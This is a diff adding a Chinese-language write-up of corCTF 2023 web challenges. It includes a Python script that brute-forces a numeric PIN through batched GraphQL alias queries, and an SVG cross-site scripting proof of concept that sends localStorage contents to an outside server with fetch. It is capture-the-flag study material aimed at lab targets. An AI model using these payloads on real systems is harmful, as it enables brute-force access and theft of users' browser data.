@@ -7,7 +7,37 @@ tags:
 
 # corctf 2023
 
-## crabspace
+## Force
+
+![](https://img.shields.io/badge/-WEB-blue?style=flat-square)
+
+题目生成了一个 `const secret = randomInt(0, 10 ** 5)` 1e5 的 sercret，提供一个 graphql 接口，可以通过 `pin` 参数来查询 flag，这里用到了 graphql 的一个性质，可以一次查询多个。
+
+```python
+import requests
+
+url = "https://web-force-force-453b7d16be39007d.be.ax/"
+
+for cnt in range(10):
+    max_num = 10000
+    start = (cnt * max_num) + 1
+    data = "query SilentE {\n"
+    data += '\n'.join([f"f{num}: flag(pin: {num})" for num in range(start, start + max_num)])
+    data += "}"
+    # print(data)
+
+    r = requests.post(url, data=data, headers={"Content-Type": "text/plain;charset=UTF-8"})
+    # print(r.text)
+    if "ctf" in r.text:
+        print(r.text)
+```
+
+
+![](https://cdn.silente.top/img/202308152014418.png)
+
+## Crabspace
+
+![](https://img.shields.io/badge/-WEB-blue?style=flat-square)
 
 题目是用 Rust 写的， axum 作为 http Server， tera 作为模板渲染引擎。flag 是 admin 的 pass，给了一个 adminbot，所以存在 xss。
 
@@ -156,3 +186,42 @@ let session_layer = SessionLayer::new(store, &secret).with_secure(false);
 - https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP
 - https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
 - https://source.chromium.org/chromium
+
+
+
+## Frogshare
+
+`/frog` 路由给了 POST 和 PATCH 一个添加 svg 一个修改 svg 的接口。 可以看看展示 svg 的代码：
+
+![](https://cdn.silente.top/img/202308190037793.png)
+
+这里的 `img` 以及 `svgProps` 均用户可控，~~但是直接注入 `img` 外链的话会被 CORS 拦下，~~ 反转了，自己服务器挂的 svg 没加 cors 头 hh，nginx 可以直接用 `add_header 'Access-Control-Allow-Origin' '*';` 加上。
+
+直接写 inline script 发现没法执行，才看到有个 `external-svg-loader` 库，需要手动开启：
+
+![](https://cdn.silente.top/img/202308190130562.png)
+
+
+Poc:
+```
+<svg width="100%" height="100%" viewBox="0 0 100 100"
+     xmlns="http://www.w3.org/2000/svg">
+  <circle cx="50" cy="50" r="45" fill="green"
+          id="foo"/>
+  <script type="text/javascript">
+    // <![CDATA[
+      fetch("https://domain/?flag=" + localStorage.flag).then();
+   // ]]>
+  </script>
+</svg>
+```
+
+![](https://cdn.silente.top/img/202308190124180.png)
+
+不过不知道为什么不能在 Props 里写 `onload`， 响应发现没有加载这玩意。
+
+```html
+<svg onload=alert('XSS')>
+```
+
+一些 svg hack: https://github.com/allanlw/svg-cheatsheet
